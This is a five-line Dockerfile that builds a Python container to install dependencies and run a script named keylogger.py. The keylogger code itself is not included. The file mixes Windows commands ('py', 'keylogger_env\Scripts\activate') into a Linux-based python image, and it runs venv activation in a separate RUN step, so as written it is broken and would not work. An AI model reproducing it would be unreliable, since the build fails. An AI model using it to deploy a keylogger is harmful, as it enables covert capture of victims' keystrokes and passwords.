FROM python:latest
RUN py -m venv keylogger_env
RUN keylogger_env\Scripts\activate
RUN pip install -r requirements.txt
CMD ["py", "keylogger.py"]